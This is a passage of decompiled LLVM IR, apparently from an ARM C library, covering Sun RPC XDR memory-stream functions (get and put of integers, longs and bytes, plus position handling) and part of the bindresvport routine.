  %v3_32a84 = inttoptr i32 %v2_32a84 to i32*
  store i32 %arg3, i32* %v3_32a84, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v3_32a88 = add i32 %tmp, 4
  %v4_32a88 = inttoptr i32 %v3_32a88 to i32*
  %v5_32a88 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v5_32a88, i32* %v4_32a88, align 4
  %v2_32a8c = add i32 %tmp, 12
  %v3_32a8c = inttoptr i32 %v2_32a8c to i32*
  store i32 %arg2, i32* %v3_32a8c, align 4
  %v2_32a90 = add i32 %tmp, 16
  %v3_32a90 = inttoptr i32 %v2_32a90 to i32*
  store i32 %arg2, i32* %v3_32a90, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v1_32aa4 = load i32, i32* @r0, align 4
  ret i32 %v1_32aa4
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_32aa8 = add i32 %arg1, 12
  %v1_32aac = inttoptr i32 %v1_32aa8 to i32*
  %v2_32aac = load i32, i32* %v1_32aac, align 4
  %v3_32aac = add i32 %arg1, 16
  %v4_32aac = inttoptr i32 %v3_32aac to i32*
  %v5_32aac = load i32, i32* %v4_32aac, align 4
  %v2_32ab0 = sub i32 %v2_32aac, %v5_32aac
  ret i32 %v2_32ab0
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v1_32abc = add i32 %arg1, 16
  %v2_32abc = inttoptr i32 %v1_32abc to i32*
  %v3_32abc = load i32, i32* %v2_32abc, align 4
  %v1_32ac0 = add i32 %arg1, 20
  %v2_32ac0 = inttoptr i32 %v1_32ac0 to i32*
  %v3_32ac0 = load i32, i32* %v2_32ac0, align 4
  %v1_32ac4 = add i32 %arg1, 12
  %v2_32ac4 = inttoptr i32 %v1_32ac4 to i32*
  %v3_32ac4 = load i32, i32* %v2_32ac4, align 4
  %v2_32ac8 = add i32 %v3_32abc, %arg2
  store i32 %v2_32ac8, i32* %r1.global-to-local, align 4
  %v2_32acc = add i32 %v3_32ac4, %v3_32ac0
  store i32 %v2_32acc, i32* %r0.global-to-local, align 4
  %v7_32ad4 = icmp slt i32 %v2_32acc, %v2_32ac8
  br i1 %v7_32ad4, label %.thread2, label %bb

.thread2:                                         ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb4

bb:                                               ; preds = %entry
  %v10_32ad4 = sub i32 %v2_32acc, %v2_32ac8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v10_32ad4, i32* %v2_32ac0, align 4
  %v8_32ae4 = load i32, i32* %r1.global-to-local, align 4
  %v9_32ae4 = load i32, i32* %ip.global-to-local, align 4
  %v10_32ae4 = add i32 %v9_32ae4, 12
  %v11_32ae4 = inttoptr i32 %v10_32ae4 to i32*
  store i32 %v8_32ae4, i32* %v11_32ae4, align 4
  %v1_32ae8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb4

bb4:                                              ; preds = %.thread2, %bb
  %v1_32ae8 = phi i32 [ 0, %.thread2 ], [ %v1_32ae8.pre, %bb ]
  ret i32 %v1_32ae8

; uselistorder directives
  uselistorder i32 %v2_32acc, { 1, 0, 2 }
  uselistorder i32 %v2_32ac8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1, 4 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v1_32aec = add i32 %arg1, 20
  %v2_32aec = inttoptr i32 %v1_32aec to i32*
  %v3_32aec = load i32, i32* %v2_32aec, align 4
  store i32 %v3_32aec, i32* %r2.global-to-local, align 4
  %v3_32af0 = icmp ult i32 %v3_32aec, %arg2
  br i1 %v3_32af0, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread4

bb12:                                             ; preds = %entry
  %v2_32af0 = sub i32 %v3_32aec, %arg2
  %v2_32af48 = add i32 %arg1, 12
  %v3_32af49 = inttoptr i32 %v2_32af48 to i32*
  %v4_32af410 = load i32, i32* %v3_32af49, align 4
  store i32 %v4_32af410, i32* %ip.global-to-local, align 4
  store i32 %v2_32af0, i32* %r2.global-to-local, align 4
  %v3_32b00 = add i32 %v4_32af410, %arg2
  store i32 %v3_32b00, i32* %v3_32af49, align 4
  %v1_32b08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_32b08, i32* %v2_32aec, align 4
  %v0_32b0c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb, %bb12
  %v0_32b0c = phi i32 [ 0, %bb ], [ %v0_32b0c.pre, %bb12 ]
  ret i32 %v0_32b0c

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_32b14 = add i32 %arg1, 20
  %v2_32b14 = inttoptr i32 %v1_32b14 to i32*
  %v3_32b14 = load i32, i32* %v2_32b14, align 4
  store i32 %v3_32b14, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %v3_32b14, 4
  br i1 %tmp, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_32b20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_32b20)
  %v0_32b24 = load i32, i32* %r3.global-to-local, align 4
  %v1_32b24 = add i32 %v0_32b24, -4
  store i32 %v1_32b24, i32* %r3.global-to-local, align 4
  %v1_32b28 = load i32, i32* %r0.global-to-local, align 4
  %v2_32b28 = add i32 %v1_32b28, 20
  %v3_32b28 = inttoptr i32 %v2_32b28 to i32*
  store i32 %v1_32b24, i32* %v3_32b28, align 4
  %v2_32b2c = load i32, i32* %arg2, align 4
  %v3_32b34 = udiv i32 %v2_32b2c, 16777216
  %v1_32b30 = udiv i32 %v2_32b2c, 256
  %v4_32b38 = and i32 %v1_32b30, 65280
  %v5_32b38 = or i32 %v4_32b38, %v3_32b34
  %v1_32b3c = and i32 %v2_32b2c, 65280
  %v4_32b40 = mul nuw nsw i32 %v1_32b3c, 256
  %v5_32b40 = or i32 %v5_32b38, %v4_32b40
  store i32 %v5_32b40, i32* %r3.global-to-local, align 4
  %v0_32b44 = load i32, i32* %r0.global-to-local, align 4
  %v1_32b44 = add i32 %v0_32b44, 12
  %v2_32b44 = inttoptr i32 %v1_32b44 to i32*
  %v3_32b44 = load i32, i32* %v2_32b44, align 4
  %v5_32b48 = call i32 @llvm.bswap.i32(i32 %v2_32b2c)
  store i32 %v5_32b48, i32* %r3.global-to-local, align 4
  %v2_32b4c = inttoptr i32 %v3_32b44 to i32*
  store i32 %v5_32b48, i32* %v2_32b4c, align 4
  %v0_32b50 = load i32, i32* %r0.global-to-local, align 4
  %v1_32b50 = add i32 %v0_32b50, 12
  %v2_32b50 = inttoptr i32 %v1_32b50 to i32*
  %v3_32b50 = load i32, i32* %v2_32b50, align 4
  %v1_32b54 = add i32 %v3_32b50, 4
  store i32 %v1_32b54, i32* %r3.global-to-local, align 4
  store i32 %v1_32b54, i32* %v2_32b50, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v5_32b48, { 1, 0 }
  uselistorder i32 %v2_32b2c, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_32b64 = add i32 %arg1, 20
  %v2_32b64 = inttoptr i32 %v1_32b64 to i32*
  %v3_32b64 = load i32, i32* %v2_32b64, align 4
  store i32 %v3_32b64, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_32b64, 4
  br i1 %tmp2, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_32b74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp2, i32 %v0_32b74)
  %v0_32b78 = load i32, i32* %r3.global-to-local, align 4
  %v1_32b78 = add i32 %v0_32b78, -4
  store i32 %v1_32b78, i32* %r3.global-to-local, align 4
  %v1_32b7c = load i32, i32* %r0.global-to-local, align 4
  %v2_32b7c = add i32 %v1_32b7c, 20
  %v3_32b7c = inttoptr i32 %v2_32b7c to i32*
  store i32 %v1_32b78, i32* %v3_32b7c, align 4
  %v0_32b80 = load i32, i32* %r0.global-to-local, align 4
  %v1_32b80 = add i32 %v0_32b80, 12
  %v2_32b80 = inttoptr i32 %v1_32b80 to i32*
  %v3_32b80 = load i32, i32* %v2_32b80, align 4
  store i32 %v3_32b80, i32* %r3.global-to-local, align 4
  %v1_32b84 = inttoptr i32 %v3_32b80 to i32*
  %v2_32b84 = load i32, i32* %v1_32b84, align 4
  %v5_32b9c = call i32 @llvm.bswap.i32(i32 %v2_32b84)
  store i32 %v5_32b9c, i32* %r3.global-to-local, align 4
  %v1_32ba0 = load i32, i32* %ip.global-to-local, align 4
  %v2_32ba0 = inttoptr i32 %v1_32ba0 to i32*
  store i32 %v5_32b9c, i32* %v2_32ba0, align 4
  %v0_32ba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_32ba4 = add i32 %v0_32ba4, 12
  %v2_32ba4 = inttoptr i32 %v1_32ba4 to i32*
  %v3_32ba4 = load i32, i32* %v2_32ba4, align 4
  %v1_32ba8 = add i32 %v3_32ba4, 4
  store i32 %v1_32ba8, i32* %r3.global-to-local, align 4
  store i32 %v1_32ba8, i32* %v2_32ba4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v5_32b9c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_32bb8 = add i32 %arg1, 20
  %v2_32bb8 = inttoptr i32 %v1_32bb8 to i32*
  %v3_32bb8 = load i32, i32* %v2_32bb8, align 4
  store i32 %v3_32bb8, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %v3_32bb8, 4
  br i1 %tmp, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_32bc4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_32bc4)
  %v0_32bc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_32bc8 = add i32 %v0_32bc8, -4
  store i32 %v1_32bc8, i32* %r3.global-to-local, align 4
  %v1_32bcc = load i32, i32* %r0.global-to-local, align 4
  %v2_32bcc = add i32 %v1_32bcc, 20
  %v3_32bcc = inttoptr i32 %v2_32bcc to i32*
  store i32 %v1_32bc8, i32* %v3_32bcc, align 4
  %v2_32bd0 = load i32, i32* %arg2, align 4
  %v3_32bd8 = udiv i32 %v2_32bd0, 16777216
  %v1_32bd4 = udiv i32 %v2_32bd0, 256
  %v4_32bdc = and i32 %v1_32bd4, 65280
  %v5_32bdc = or i32 %v4_32bdc, %v3_32bd8
  %v1_32be0 = and i32 %v2_32bd0, 65280
  %v4_32be4 = mul nuw nsw i32 %v1_32be0, 256
  %v5_32be4 = or i32 %v5_32bdc, %v4_32be4
  store i32 %v5_32be4, i32* %r3.global-to-local, align 4
  %v0_32be8 = load i32, i32* %r0.global-to-local, align 4
  %v1_32be8 = add i32 %v0_32be8, 12
  %v2_32be8 = inttoptr i32 %v1_32be8 to i32*
  %v3_32be8 = load i32, i32* %v2_32be8, align 4
  %v5_32bec = call i32 @llvm.bswap.i32(i32 %v2_32bd0)
  store i32 %v5_32bec, i32* %r3.global-to-local, align 4
  %v2_32bf0 = inttoptr i32 %v3_32be8 to i32*
  store i32 %v5_32bec, i32* %v2_32bf0, align 4
  %v0_32bf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_32bf4 = add i32 %v0_32bf4, 12
  %v2_32bf4 = inttoptr i32 %v1_32bf4 to i32*
  %v3_32bf4 = load i32, i32* %v2_32bf4, align 4
  %v1_32bf8 = add i32 %v3_32bf4, 4
  store i32 %v1_32bf8, i32* %r3.global-to-local, align 4
  store i32 %v1_32bf8, i32* %v2_32bf4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v5_32bec, { 1, 0 }
  uselistorder i32 %v2_32bd0, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_32c08 = add i32 %arg1, 20
  %v2_32c08 = inttoptr i32 %v1_32c08 to i32*
  %v3_32c08 = load i32, i32* %v2_32c08, align 4
  store i32 %v3_32c08, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_32c08, 4
  br i1 %tmp2, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_32c18 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp2, i32 %v0_32c18)
  %v0_32c1c = load i32, i32* %r3.global-to-local, align 4
  %v1_32c1c = add i32 %v0_32c1c, -4
  store i32 %v1_32c1c, i32* %r3.global-to-local, align 4
  %v1_32c20 = load i32, i32* %r0.global-to-local, align 4
  %v2_32c20 = add i32 %v1_32c20, 20
  %v3_32c20 = inttoptr i32 %v2_32c20 to i32*
  store i32 %v1_32c1c, i32* %v3_32c20, align 4
  %v0_32c24 = load i32, i32* %r0.global-to-local, align 4
  %v1_32c24 = add i32 %v0_32c24, 12
  %v2_32c24 = inttoptr i32 %v1_32c24 to i32*
  %v3_32c24 = load i32, i32* %v2_32c24, align 4
  store i32 %v3_32c24, i32* %r3.global-to-local, align 4
  %v1_32c28 = inttoptr i32 %v3_32c24 to i32*
  %v2_32c28 = load i32, i32* %v1_32c28, align 4
  %v5_32c40 = call i32 @llvm.bswap.i32(i32 %v2_32c28)
  store i32 %v5_32c40, i32* %r3.global-to-local, align 4
  %v1_32c44 = load i32, i32* %ip.global-to-local, align 4
  %v2_32c44 = inttoptr i32 %v1_32c44 to i32*
  store i32 %v5_32c40, i32* %v2_32c44, align 4
  %v0_32c48 = load i32, i32* %r0.global-to-local, align 4
  %v1_32c48 = add i32 %v0_32c48, 12
  %v2_32c48 = inttoptr i32 %v1_32c48 to i32*
  %v3_32c48 = load i32, i32* %v2_32c48, align 4
  %v1_32c4c = add i32 %v3_32c48, 4
  store i32 %v1_32c4c, i32* %r3.global-to-local, align 4
  store i32 %v1_32c4c, i32* %v2_32c48, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v5_32c40, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  %v1_32c60 = add i32 %arg1, 20
  %v2_32c60 = inttoptr i32 %v1_32c60 to i32*
  %v3_32c60 = load i32, i32* %v2_32c60, align 4
  %v2_32c64 = sub i32 %v3_32c60, %arg2
  %v3_32c64 = icmp ult i32 %v3_32c60, %arg2
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v3_32c64, label %bb, label %dec_label_pc_32c7c

bb:                                               ; preds = %entry
  br label %dec_label_pc_32c9c

dec_label_pc_32c7c:                               ; preds = %entry
  store i32 %v2_32c64, i32* @r3, align 4
  store i32 %v2_32c64, i32* %v2_32c60, align 4
  %v0_32c84 = load i32, i32* @r4, align 4
  %v1_32c84 = add i32 %v0_32c84, 12
  %v2_32c84 = inttoptr i32 %v1_32c84 to i32*
  %v3_32c84 = load i32, i32* %v2_32c84, align 4
  store i32 %v3_32c84, i32* @r0, align 4
  %v0_32c88 = call i32 @memcpy()
  %v0_32c8c = load i32, i32* @r4, align 4
  %v1_32c8c = add i32 %v0_32c8c, 12
  %v2_32c8c = inttoptr i32 %v1_32c8c to i32*
  %v3_32c8c = load i32, i32* %v2_32c8c, align 4
  %v1_32c90 = load i32, i32* @r5, align 4
  %v2_32c90 = add i32 %v1_32c90, %v3_32c8c
  store i32 %v2_32c90, i32* %v2_32c8c, align 4
  br label %dec_label_pc_32c9c

dec_label_pc_32c9c:                               ; preds = %bb, %dec_label_pc_32c7c
  %v1_32ca4 = phi i32 [ 0, %bb ], [ 1, %dec_label_pc_32c7c ]
  ret i32 %v1_32ca4

; uselistorder directives
  uselistorder i32 %v2_32c64, { 1, 0 }
  uselistorder i32 %v3_32c60, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_32c9c, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r2, align 4
  %v1_32cac = add i32 %arg1, 20
  %v2_32cac = inttoptr i32 %v1_32cac to i32*
  %v3_32cac = load i32, i32* %v2_32cac, align 4
  %v2_32cb0 = sub i32 %v3_32cac, %arg3
  %v3_32cb0 = icmp ult i32 %v3_32cac, %arg3
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v3_32cb0, label %bb, label %dec_label_pc_32ccc

bb:                                               ; preds = %entry
  br label %dec_label_pc_32cec

dec_label_pc_32ccc:                               ; preds = %entry
  store i32 %v2_32cb0, i32* @r3, align 4
  store i32 %v2_32cb0, i32* %v2_32cac, align 4
  %v0_32cd4 = load i32, i32* @r4, align 4
  %v1_32cd4 = add i32 %v0_32cd4, 12
  %v2_32cd4 = inttoptr i32 %v1_32cd4 to i32*
  %v3_32cd4 = load i32, i32* %v2_32cd4, align 4
  store i32 %v3_32cd4, i32* @r1, align 4
  %v0_32cd8 = call i32 @memcpy()
  %v0_32cdc = load i32, i32* @r4, align 4
  %v1_32cdc = add i32 %v0_32cdc, 12
  %v2_32cdc = inttoptr i32 %v1_32cdc to i32*
  %v3_32cdc = load i32, i32* %v2_32cdc, align 4
  %v1_32ce0 = load i32, i32* @r5, align 4
  %v2_32ce0 = add i32 %v1_32ce0, %v3_32cdc
  store i32 %v2_32ce0, i32* %v2_32cdc, align 4
  br label %dec_label_pc_32cec

dec_label_pc_32cec:                               ; preds = %bb, %dec_label_pc_32ccc
  %v1_32cf4 = phi i32 [ 0, %bb ], [ 1, %dec_label_pc_32ccc ]
  ret i32 %v1_32cf4

; uselistorder directives
  uselistorder i32 %v2_32cb0, { 1, 0 }
  uselistorder i32 %v3_32cac, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_32cec, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v12_32cf8 = load i32, i32* @r7, align 4
  %v27_32cf8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r7, align 4
  %v3_32d00 = icmp eq i16* %arg2, null
  %v2_32d04 = ptrtoint i32* %stack_var_-56 to i32
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %sb.global-to-local, align 4
  br i1 %v3_32d00, label %dec_label_pc_32d14, label %dec_label_pc_32d30

dec_label_pc_32d14:                               ; preds = %entry
  store i32 16, i32* @r2, align 4
  store i32 %v2_32d04, i32* @r0, align 4
  %v0_32d1c = call i32 @__GI_memset()
  store i32 %v0_32d1c, i32* @r0, align 4
  store i32 %v2_32d04, i32* @r7, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v0_32d54.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_32d50

dec_label_pc_32d30:                               ; preds = %entry
  %v2_32d30 = load i16, i16* %arg2, align 2
  %v3_32d30 = zext i16 %v2_32d30 to i32
  store i32 %v3_32d30, i32* %r3.global-to-local, align 4
  %v7_32d34 = icmp eq i16 %v2_32d30, 2
  br i1 %v7_32d34, label %dec_label_pc_32d50, label %dec_label_pc_32d3c

dec_label_pc_32d3c:                               ; preds = %dec_label_pc_32d30
  %v0_32d3c = call i32 @__GI___errno_location()
  store i32 96, i32* @r3, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_32d48 = inttoptr i32 %v0_32d3c to i32*
  store i32 96, i32* %v2_32d48, align 4
  %v0_32e10.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_32e10

dec_label_pc_32d50:                               ; preds = %dec_label_pc_32d30, %dec_label_pc_32d14
  %v0_32d54 = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %dec_label_pc_32d30 ], [ %v0_32d54.pre, %dec_label_pc_32d14 ]
  store i32 55996, i32* %r4.global-to-local, align 4
  %v2_32d54 = add i32 %v0_32d54, 55996
  %v3_32d54 = inttoptr i32 %v2_32d54 to i16*
  %v4_32d54 = load i16, i16* %v3_32d54, align 2
  %v6_32d54 = sext i16 %v4_32d54 to i32
  store i32 %v6_32d54, i32* %r3.global-to-local, align 4
  %v2_32d58 = icmp eq i16 %v4_32d54, 0
  br i1 %v2_32d58, label %dec_label_pc_32d60, label %dec_label_pc_32d74

dec_label_pc_32d60:                               ; preds = %dec_label_pc_32d50
  %v0_32d60 = call i32 @__GI_getpid()
  %v3_32d68 = urem i32 %v0_32d60, 424
  %v1_32d6c = add nuw nsw i32 %v3_32d68, 600
  %v1_32d70 = trunc i32 %v1_32d6c to i16
  %v2_32d70 = load i32, i32* %r6.global-to-local, align 4
  %v3_32d70 = load i32, i32* %r4.global-to-local, align 4
  %v4_32d70 = add i32 %v3_32d70, %v2_32d70
  %v5_32d70 = inttoptr i32 %v4_32d70 to i16*
  store i16 %v1_32d70, i16* %v5_32d70, align 2
  br label %dec_label_pc_32d74

dec_label_pc_32d74:                               ; preds = %dec_label_pc_32d50, %dec_label_pc_32d60
  %v0_32d74 = call i32 @__GI___errno_location()
  store i32 1023, i32* %fp.global-to-local, align 4
  store i32 98, i32* %r3.global-to-local, align 4
  store i32 %v0_32d74, i32* %sl.global-to-local, align 4
  %v0_32d84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_32d84, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_32d90 = inttoptr i32 %v0_32d74 to i32*
  store i32 98, i32* %v2_32d90, align 4
  %v0_32ddc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_32dd8

dec_label_pc_32d98:                               ; preds = %dec_label_pc_32e04
  %v0_32d98 = load i32, i32* %r6.global-to-local, align 4
  %v1_32d98 = load i32, i32* %r5.global-to-local, align 4
  %v2_32d98 = add i32 %v1_32d98, %v0_32d98
  %v3_32d98 = inttoptr i32 %v2_32d98 to i16*
  %v4_32d98 = load i16, i16* %v3_32d98, align 2
  %v6_32d98 = zext i16 %v4_32d98 to i32
  %v1_32d9c = add nuw nsw i32 %v6_32d98, 1
  %v3_32da4 = mul nuw i32 %v6_32d98, 65536
  store i32 %v3_32da4, i32* %ip.global-to-local, align 4
  %v3_32da8 = urem i32 %v1_32d9c, 65536
  store i32 %v3_32da8, i32* @lr, align 4
  %v3_32dac = mul nuw nsw i32 %v6_32d98, 256
  %v3_32db0 = mul i32 %v1_32d9c, 65536
  store i32 %v3_32db0, i32* %r4.global-to-local, align 4
  %v1_32db4 = and i32 %v3_32dac, 65280
  %div = udiv i16 %v4_32d98, 256
  %v4_32db8 = zext i16 %div to i32
  %v5_32db8 = or i32 %v1_32db4, %v4_32db8
  store i32 %v5_32db8, i32* %r3.global-to-local, align 4
  %v0_32dbc = load i32, i32* %fp.global-to-local, align 4
  %v4_32dbc = sdiv i32 %v3_32db0, 65536
  %v1_32dc0 = trunc i32 %v5_32db8 to i16
  %v3_32dc0 = add i32 %v0_32df4, 2
  %v4_32dc0 = inttoptr i32 %v3_32dc0 to i16*
  store i16 %v1_32dc0, i16* %v4_32dc0, align 2
  %v5_32dc4 = icmp slt i32 %v0_32dbc, %v4_32dbc
  br i1 %v5_32dc4, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_32d98
  store i32 600, i32* %r3.global-to-local, align 4
  %v0_32dc8 = load i32, i32* @lr, align 4
  %v1_32dc8 = trunc i32 %v0_32dc8 to i16
  %v2_32dc8 = load i32, i32* %r6.global-to-local, align 4
  %v3_32dc8 = load i32, i32* %r5.global-to-local, align 4
  %v4_32dc8 = add i32 %v3_32dc8, %v2_32dc8
  %v5_32dc8 = inttoptr i32 %v4_32dc8 to i16*
  store i16 %v1_32dc8, i16* %v5_32dc8, align 2
  %v6_32dcc = load i32, i32* %r3.global-to-local, align 4
  %v7_32dcc = trunc i32 %v6_32dcc to i16
  %v8_32dcc = load i32, i32* %r6.global-to-local, align 4
  %v9_32dcc = load i32, i32* %r5.global-to-local, align 4
  %v10_32dcc = add i32 %v9_32dcc, %v8_32dcc
  %v11_32dcc = inttoptr i32 %v10_32dcc to i16*
  store i16 %v7_32dcc, i16* %v11_32dcc, align 2
  br label %bb16

.critedge:                                        ; preds = %dec_label_pc_32d98
  %v0_32dc8.c = load i32, i32* @lr, align 4
  %v1_32dc8.c = trunc i32 %v0_32dc8.c to i16
  %v2_32dc8.c = load i32, i32* %r6.global-to-local, align 4
  %v3_32dc8.c = load i32, i32* %r5.global-to-local, align 4
  %v4_32dc8.c = add i32 %v3_32dc8.c, %v2_32dc8.c
  %v5_32dc8.c = inttoptr i32 %v4_32dc8.c to i16*
  store i16 %v1_32dc8.c, i16* %v5_32dc8.c, align 2
  br label %bb16

bb16:                                             ; preds = %.critedge, %bb
  %v4_32dd0 = load i32, i32* %r3.global-to-local, align 4
  %v5_32dd0 = call i32 @bind(i32 %v0_32df0, i32 %v0_32df4, i32 16, i32 %v4_32dd0)
  store i32 %v5_32dd0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_32dd8

dec_label_pc_32dd8:                               ; preds = %dec_label_pc_32d74, %bb16
  %v0_32ddc = phi i32 [ %v0_32ddc.pre, %dec_label_pc_32d74 ], [ %v5_32dd0, %bb16 ]
  %tmp17 = icmp slt i32 %v0_32ddc, 0
  %v3_32ddc = zext i1 %tmp17 to i32
  %v0_32de0 = load i32, i32* %r8.global-to-local, align 4
  %v7_32de4 = icmp sgt i32 %v0_32de0, 423
  %storemerge = select i1 %v7_32de4, i32 0, i32 %v3_32ddc
  store i32 %storemerge, i32* @r3, align 4
  %v2_32dec = icmp eq i32 %storemerge, 0
  %v0_32df0 = load i32, i32* %sb.global-to-local, align 4
  %v0_32df4 = load i32, i32* @r7, align 4
  %v1_32dfc = add i32 %v0_32de0, 1
  store i32 %v1_32dfc, i32* %r8.global-to-local, align 4
  br i1 %v2_32dec, label %dec_label_pc_32e10, label %dec_label_pc_32e04

dec_label_pc_32e04:                               ; preds = %dec_label_pc_32dd8
  %v0_32e04 = load i32, i32* %sl.global-to-local, align 4
